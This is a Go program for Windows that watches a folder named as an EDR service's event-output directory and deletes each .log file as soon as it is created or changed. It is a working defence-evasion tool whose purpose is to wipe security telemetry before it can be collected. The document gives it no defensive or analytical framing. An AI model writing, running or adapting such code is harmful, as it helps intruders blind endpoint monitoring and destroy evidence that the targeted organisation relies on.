package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Configure these:
var (
	watchDir      = `C:\ProgramData\edrsvc\log\output_events` // directory to monitor (non-recursive)
	targetPattern = `*.log`                                   // glob for matching filenames in watchDir
)

func main() {
	h, err := windows.CreateFile(
		windows.StringToUTF16Ptr(watchDir),
		windows.FILE_LIST_DIRECTORY,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
		nil,
		windows.OPEN_EXISTING,
		// Synchronous (no OVERLAPPED) for simplicity and reliability
		windows.FILE_FLAG_BACKUP_SEMANTICS,
		0,
	)
	if err != nil {
		fmt.Printf("[-] Failed to open directory handle: %v\n", err)
		return
	}
	defer windows.CloseHandle(h)

	fmt.Printf("[*] Monitoring folder: %s\n", watchDir)
	fmt.Printf("[*] Using filename glob: %q\n", targetPattern)

	buf := make([]byte, 64*1024)

	const notifyMask = windows.FILE_NOTIFY_CHANGE_FILE_NAME |
		windows.FILE_NOTIFY_CHANGE_LAST_WRITE |
		windows.FILE_NOTIFY_CHANGE_CREATION |
		windows.FILE_NOTIFY_CHANGE_ATTRIBUTES

	for {
		var bytesReturned uint32
		if err := windows.ReadDirectoryChanges(
			h,
			&buf[0],
			uint32(len(buf)),
			false, // non-recursive
			notifyMask,
			&bytesReturned,
			nil, // overlapped (nil since synchronous)
			0,   // completion routine (uintptr)
		); err != nil {
			fmt.Printf("[-] Failed to read directory changes: %v\n", err)
			time.Sleep(250 * time.Millisecond)
			continue
		}

		offset := 0
		for {
			info := (*windows.FileNotifyInformation)(unsafe.Pointer(&buf[offset]))

			// FileNameLength is in bytes; convert to UTF-16 length
			nameLen := int(info.FileNameLength / 2)
			nameSlice := unsafe.Slice(&info.FileName, nameLen)
			filename := windows.UTF16ToString(nameSlice)
			fullPath := filepath.Join(watchDir, filename)

			// Case-insensitive glob match for filename only (not full path)
			nameLower := strings.ToLower(filename)
			patternLower := strings.ToLower(targetPattern)
			matched, _ := filepath.Match(patternLower, nameLower)

			if matched {
				fmt.Printf("[+] Detected change (%d) on %s (matches %q). Deleting...\n",
					info.Action, fullPath, targetPattern)
				deleteFile(fullPath)
			}

			if info.NextEntryOffset == 0 {
				break
			}
			offset += int(info.NextEntryOffset)
			if offset >= int(bytesReturned) {
				break
			}
		}
	}
}

func deleteFile(path string) {
	// Brief delay in case the writer still holds a handle
	time.Sleep(100 * time.Millisecond)

	if err := os.Remove(path); err != nil {
		fmt.Printf("[-] Failed to delete file: %v\n", err)
	} else {
		fmt.Printf("[+] File deleted: %s\n", path)
	}
}
